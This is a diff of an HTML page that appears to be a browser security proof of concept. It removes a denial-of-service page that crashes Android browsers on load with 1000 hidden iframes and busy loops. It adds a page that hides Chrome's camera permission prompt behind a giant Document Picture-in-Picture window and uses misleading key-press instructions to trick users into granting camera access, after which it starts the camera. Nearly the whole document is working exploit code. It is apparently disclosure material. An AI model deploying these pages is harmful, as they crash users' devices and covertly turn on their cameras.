@@ -1,51 +1,57 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 <head>
-    <title>Crash PoC Onload</title>
-</head>
-<body onload="triggerCrash()">
-    <h1>Loading... (Will Crash on Android)</h1>
-</body>
-<script>
-// Function to cause OOM crash via heavy iframes and CPU hog
-function triggerCrash() {
-    // Increase iframes to 500 for guaranteed OOM on Android
-    for (let i = 0; i < 1000; i++) {
-        let iframe = document.createElement("iframe");
-        iframe.src = 'https://www.youtube.com/embed/dQw4w9WgXcQ'; // Heavier: YouTube video embed for more memory pressure (videos + scripts)
-        iframe.style = 'display:none';
-        document.body.appendChild(iframe);
-    }
-    
-    // Web Worker for CPU hog (extended to 500ms)
-    const workerCode = `
-        onmessage = () => {
-            let a = 0, b = 1;
-            const start = performance.now();
-            while (performance.now() - start < 1000) {
-                let c = a + b;
-                a = b;
-                b = c;
-            }
-            postMessage('done');
-        };
-    `;
-    const blob = new Blob([workerCode], {type: 'application/javascript'});
-    const worker = new Worker(URL.createObjectURL(blob));
-    worker.postMessage('start');
-    worker.onmessage = () => worker.terminate();
-    
-    // Busy-wait to block main thread (extended for ANR)
-    let start = performance.now();
-    while (performance.now() - start < 200) {} // 200ms block
-    
-    // Optional: Recursive call for infinite load (permanen until crash)
-    setTimeout(triggerCrash, 1000); // Re-trigger every second for persistent pressure
-}
+<style>
+html { font-family: sans-serif; }
+#instructions { text-align: center; margin-top: 200px; font-size: 2em; user-select: none; }
 
-// Optional: Run immediately if no onload needed
-if (location.href.indexOf("fake") !== -1) {
-    triggerCrash(); // For popup variant
+#wrapper {
+    /* Setting PEPC position directly often leads to renderer crashes :( */
+    position: absolute;
+    bottom: 0;
+    right: 0px;
 }
+#permElem {
+    /* Try to hide the PEPC prompt as much as possible */
+    width: fit-content;
+    height: 1px;
+    font-size: 11px;
+    outline: none;
+    background: #fff;
+    color: #888;
+}
+</style>
+</head>
+<body>
+<h1>PoC: PEPC prompt obscured by Document PiP window</h1>
+<p>Also works with Video PiP, but since <code>PictureInPictureOcclusionTracker</code> will track both, only using Document PiP for this PoC.</p>
+<p id="instructions">Press tab, then enter</p>
+<div id="wrapper">
+    <permission id="permElem" type="camera">
+</div>
+<script>
+// Interestingly, opening PEPC prompt refocuses the page with the prompt,
+// therefore we don't need more user interaction to steal focus from the
+// PiP window after opening it.
+var newWin;
+permElem.addEventListener('keydown', async (e) => {
+    if (e.keyCode == 9) {
+        // Ignore tab key
+        return;
+    }
+    if (newWin && !newWin.closed) { return; }
+    newWin = await documentPictureInPicture.requestWindow({width: 9000, height: 9000, disallowReturnToOpener: true});
+    newWin.document.body.innerHTML = '<style>html { font-family: sans-serif; }</style><h1>Press tab twice, then enter</h1>';
+});
+setInterval(async () => {
+    var permStatus = await navigator.permissions.query({name: 'camera'});
+    if (permStatus.state == 'granted') {
+        instructions.innerText = 'Thank you!';
+        permElem.remove();
+        newWin.close();
+        navigator.mediaDevices.getUserMedia({video: true});
+    }
+}, 500);
 </script>
+</body>
 </html>
